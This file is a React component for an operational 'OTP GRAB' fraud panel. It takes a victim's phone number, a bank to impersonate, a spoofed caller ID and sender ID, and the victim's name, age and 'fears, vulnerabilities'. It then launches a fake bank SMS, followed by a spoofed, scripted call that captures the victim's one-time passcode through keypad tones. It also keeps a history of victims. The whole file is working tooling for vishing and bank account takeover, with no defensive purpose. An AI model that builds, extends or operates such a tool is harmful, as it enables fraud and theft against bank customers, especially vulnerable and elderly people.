"use client";

import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { api } from "@/lib/api";
import { normalizePhone, formatPhone, isCompletePhone } from "@/lib/phone";
import { useToast } from "@/lib/toast";

const banks = ["Chase", "Bank of America", "Wells Fargo", "Coinbase", "PayPal", "Venmo", "Citibank", "US Bank", "Capital One", "Custom"];

export default function OTPGrab() {
  const [phone, setPhone] = useState("");
  const [bank, setBank] = useState("Chase");
  const [spoofedCID, setSpoofedCID] = useState("");
  const [senderID, setSenderID] = useState("");
  const [targetName, setTargetName] = useState("");
  const [targetAge, setTargetAge] = useState(35);
  const [details, setDetails] = useState("");
  const [grabId, setGrabId] = useState("");
  const [status, setStatus] = useState("");
  const [smsSent, setSmsSent] = useState(false);
  const [callId, setCallId] = useState("");
  const [callStatus, setCallStatus] = useState("");
  const [dtmfCaptured, setDtmfCaptured] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval>>();
  const [history, setHistory] = useState<any[]>([]);
  const { toast } = useToast();

  useEffect(() => {
    api.request<any>("GET", "/otp/grabs").then(r => setHistory(r.grabs || [])).catch(() => {});
  }, []);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  const startPolling = (id: string) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const r: any = await api.request("GET", `/otp/grab/${id}`);
        setStatus(r.status);
        setSmsSent(r.sms_sent);
        setCallId(r.call_id || "");
        setCallStatus(r.call_status || "");
        setDtmfCaptured(r.dtmf_captured || "");
        if (r.error) setError(r.error);
        if (r.status === "completed" || r.status === "failed") {
          if (pollRef.current) clearInterval(pollRef.current);
          setLoading(false);
          toast(r.status === "completed" ? "OTP captured!" : "Grab failed", r.status === "completed" ? "success" : "error");
        }
      } catch { /* ignore */ }
    }, 2000);
  };

  const handleLaunch = async () => {
    if (!phone || !bank || !spoofedCID) { setError("Phone, bank, and spoofed CID required"); return; }
    if (!isCompletePhone(phone) || !isCompletePhone(spoofedCID)) {
      setError("Numbers must be 1+10-digit format (1+555-555-5555)");
      return;
    }
    setError("");
    setLoading(true);
    setStatus("launching");
    setSmsSent(false);
    setCallId("");
    setCallStatus("");
    setDtmfCaptured("");
    try {
      const r: any = await api.request("POST", "/otp/grab", {
        phone_number: normalizePhone(phone),
        bank_name: bank,
        sender_id: senderID || bank,
        spoofed_caller_id: normalizePhone(spoofedCID),
        spoofed_name: bank,
        target_name: targetName,
        target_age: targetAge,
        target_details: details,
      });
      setGrabId(r.id);
      setStatus("pending");
      startPolling(r.id);
      setHistory(prev => [{ id: r.id, status: "pending", bank_name: bank, phone_number: phone, target_name: targetName, created_at: new Date() }, ...prev]);
      toast("OTP grab launched", "success");
    } catch (e: any) {
      setError(e.message || "Launch failed");
      setLoading(false);
      toast(e.message, "error");
    }
  };

  const statusColor = (s: string) => {
    switch (s) {
      case "pending": return "text-yellow-400";
      case "sms_sent": return "text-blue-400";
      case "generating_script": return "text-purple-400";
      case "call_initiated":
      case "call_active": return "text-green-400";
      case "completed": return "text-green-400";
      case "failed": return "text-red-400";
      default: return "text-[#525252]";
    }
  };

  const timeline = [
    { key: "pending", label: "Launching grab", icon: "1" },
    { key: "sms_sent", label: "SMS sent with fake alert", icon: "2" },
    { key: "generating_script", label: "Generating script (25s delay)", icon: "3" },
    { key: "call_active", label: "Call active — capturing OTP", icon: "4" },
    { key: "completed", label: "Grab complete", icon: "5" },
  ];

  return (
    <div className="flex flex-col gap-5 pt-2">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center"
      >
        <span className="text-2xl font-bold bg-gradient-to-r from-red-500 to-orange-500 bg-clip-text text-transparent">
          OTP GRAB
        </span>
        <div className="text-[10px] text-[#525252] font-mono mt-1">SMS SPOOF → 25s DELAY → SPOOFED CALL</div>
      </motion.div>

      {/* Setup form */}
      {!grabId && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="card space-y-3"
        >
          <div>
            <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Target Phone Number</label>
            <input
              className="input-field text-center tracking-widest font-mono"
              placeholder="1+555-555-5555"
              value={formatPhone(phone)}
              onChange={e => setPhone(e.target.value.replace(/[^0-9+]/g, ""))}
            />
          </div>

          <div className="flex gap-3">
            <div className="flex-[2]">
              <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Bank / Service</label>
              <select className="input-field font-mono" value={bank} onChange={e => setBank(e.target.value)}>
                {banks.map(b => <option key={b}>{b}</option>)}
              </select>
            </div>
            <div className="flex-1">
              <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Sender ID</label>
              <input className="input-field font-mono" placeholder={bank} value={senderID} onChange={e => setSenderID(e.target.value)} />
            </div>
          </div>

          <div>
            <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Spoofed Caller ID</label>
            <input
              className="input-field text-center tracking-widest font-mono"
              placeholder="1+800-555-5555"
              value={formatPhone(spoofedCID)}
              onChange={e => setSpoofedCID(e.target.value.replace(/[^0-9+]/g, ""))}
            />
          </div>

          <div className="flex gap-3">
            <div className="flex-1">
              <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Victim Name</label>
              <input className="input-field font-mono" placeholder="Optional" value={targetName} onChange={e => setTargetName(e.target.value)} />
            </div>
            <div className="w-20">
              <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Age</label>
              <input type="number" className="input-field font-mono" value={targetAge} onChange={e => setTargetAge(+e.target.value)} />
            </div>
          </div>

          <div>
            <label className="text-[#525252] text-[10px] font-mono tracking-widest uppercase block mb-1">Known Details</label>
            <textarea
              className="textarea-field font-mono text-sm"
              rows={2}
              placeholder="Recent transactions, fears, vulnerabilities..."
              value={details}
              onChange={e => setDetails(e.target.value)}
            />
          </div>

          <motion.button
            whileTap={{ scale: 0.97 }}
            onClick={handleLaunch}
            disabled={loading || !phone || !spoofedCID}
            className="w-full py-4 rounded-xl bg-gradient-to-r from-red-600 to-orange-600 text-white font-bold text-sm
              hover:from-red-500 hover:to-orange-500 transition-all disabled:opacity-30 disabled:cursor-not-allowed
              shadow-lg shadow-red-500/20 flex items-center justify-center gap-2"
          >
            {loading ? (
              <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
            ) : (
              <>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                  <circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/>
                </svg>
                LAUNCH OTP GRAB
              </>
            )}
          </motion.button>
          {error && <div className="text-red-400 text-xs font-mono text-center">{error}</div>}
        </motion.div>
      )}

      {/* Active grab */}
      {grabId && (
        <motion.div
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          className="card space-y-4"
        >
          {/* Status header */}
          <div className="flex items-center justify-between">
            <div>
              <div className="text-[10px] text-[#525252] font-mono tracking-widest uppercase">Grab ID</div>
              <div className="text-xs font-mono text-[#a3a3a3]">{grabId.slice(0, 8)}...</div>
            </div>
            <div className={`flex items-center gap-2 ${statusColor(status)}`}>
              {status !== "completed" && status !== "failed" && (
                <span className="w-2 h-2 rounded-full bg-current animate-pulse" />
              )}
              <span className="text-xs font-mono font-semibold uppercase tracking-wider">{status.replace(/_/g, " ")}</span>
            </div>
          </div>

          {/* Timeline */}
          <div className="space-y-3">
            {timeline.map((step, i) => {
              const currentIdx = timeline.findIndex(t => t.key === status);
              const isPast = i < currentIdx;
              const isActive = step.key === status;
              const isFailed = status === "failed";
              return (
                <motion.div
                  key={step.key}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: i * 0.05 }}
                  className="flex items-center gap-3"
                >
                  <div className={`w-7 h-7 rounded-full flex items-center justify-center text-[10px] font-mono font-bold
                    ${isPast ? "bg-green-500/20 text-green-400 border border-green-500/30" :
                      isActive && !isFailed ? "bg-red-500/20 text-red-400 border border-red-500/30 animate-pulse" :
                      isFailed && i === currentIdx ? "bg-red-500/20 text-red-400 border border-red-500/30" :
                      "bg-white/[0.03] text-[#404040] border border-white/[0.04]"}`}
                  >
                    {isPast ? "✓" : step.icon}
                  </div>
                  <div className={`text-xs font-mono ${
                    isPast ? "text-[#525252]" :
                    isActive && !isFailed ? "text-red-400" :
                    isFailed && i === currentIdx ? "text-red-400" :
                    "text-[#404040]"
                  }`}>
                    {step.label}
                  </div>
                </motion.div>
              );
            })}
          </div>

          {/* Live updates */}
          <AnimatePresence>
            {smsSent && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0 }}
                className="text-xs font-mono text-[#a3a3a3] bg-white/[0.02] rounded-lg p-3 border border-white/[0.03]"
              >
                SMS sent to {phone} — victim should receive fake {bank} alert
              </motion.div>
            )}
            {callId && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0 }}
                className="text-xs font-mono text-[#a3a3a3] bg-white/[0.02] rounded-lg p-3 border border-white/[0.03]"
              >
                Call active — spoofed as {spoofedCID}
              </motion.div>
            )}
            {dtmfCaptured && (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center p-4 bg-green-500/5 border border-green-500/20 rounded-xl"
              >
                <div className="text-[10px] text-green-400 font-mono tracking-widest uppercase mb-1">OTP CAPTURED</div>
                <div className="text-3xl tracking-[0.5em] font-mono font-bold text-green-400 glitch">{dtmfCaptured}</div>
              </motion.div>
            )}
          </AnimatePresence>

          {(status === "completed" || status === "failed") && (
            <motion.button
              whileTap={{ scale: 0.97 }}
              onClick={() => { setGrabId(""); setStatus(""); setSmsSent(false); setCallId(""); setCallStatus(""); setDtmfCaptured(""); setError(""); }}
              className="btn-secondary w-full text-sm py-3"
            >
              NEW GRAB
            </motion.button>
          )}
        </motion.div>
      )}

      {/* History */}
      {history.length > 0 && !grabId && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="card"
        >
          <div className="text-[10px] text-[#525252] font-mono tracking-widest uppercase mb-3">Grab History</div>
          <div className="space-y-2 max-h-48 overflow-y-auto">
            {history.map((g: any, i: number) => (
              <motion.div
                key={g.id}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: i * 0.02 }}
                className="text-xs bg-white/[0.02] rounded-lg p-3 border border-white/[0.03]"
              >
                <div className="flex justify-between items-center">
                  <span className="text-red-400 font-mono">{g.bank_name || "Unknown"}</span>
                  <span className={`font-mono ${
                    g.status === "completed" ? "text-green-400" : g.status === "failed" ? "text-red-400" : "text-yellow-400"
                  }`}>{g.status}</span>
                </div>
                <div className="text-[#525252] font-mono mt-1">
                  {g.phone_number}{g.target_name ? ` — ${g.target_name}` : ""}
                </div>
              </motion.div>
            ))}
          </div>
        </motion.div>
      )}
    </div>
  );
}
